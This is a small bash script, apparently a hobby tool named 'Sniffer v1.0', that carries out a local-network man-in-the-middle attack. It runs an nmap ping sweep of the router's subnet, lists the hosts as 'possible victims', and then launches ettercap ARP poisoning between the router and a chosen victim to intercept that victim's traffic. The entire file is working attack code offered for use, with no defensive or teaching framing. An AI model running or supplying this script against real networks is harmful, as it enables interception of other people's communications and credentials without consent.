#!/bin/bash
 echo "
░██████╗███╗░░██╗██╗███████╗███████╗███████╗██████╗░
██╔════╝████╗░██║██║██╔════╝██╔════╝██╔════╝██╔══██╗
╚█████╗░██╔██╗██║██║█████╗░░█████╗░░█████╗░░██████╔╝
░╚═══██╗██║╚████║██║██╔══╝░░██╔══╝░░██╔══╝░░██╔══██╗
██████╔╝██║░╚███║██║██║░░░░░██║░░░░░███████╗██║░░██║
╚═════╝░╚═╝░░╚══╝╚═╝╚═╝░░░░░╚═╝░░░░░╚══════╝╚═╝░░╚═╝ v1.0"

echo "Please make sure you have installed Ettercap and Nmap on your terminal before you start!"

read -p "Local Network's Router IP: " ROUTER_IP

echo 
sudo nmap -sn $ROUTER_IP/24

echo "Here is a list off all possible victims on your network"


read -p "Victim IP: " VICTIM_IP
read -p "Network's Interface: " NETWORK_INTERFACE

 echo
 sudo ettercap -T -S -i $NETWORK_INTERFACE -M arp:remote /$ROUTER_IP// /$VICTIM_IP//
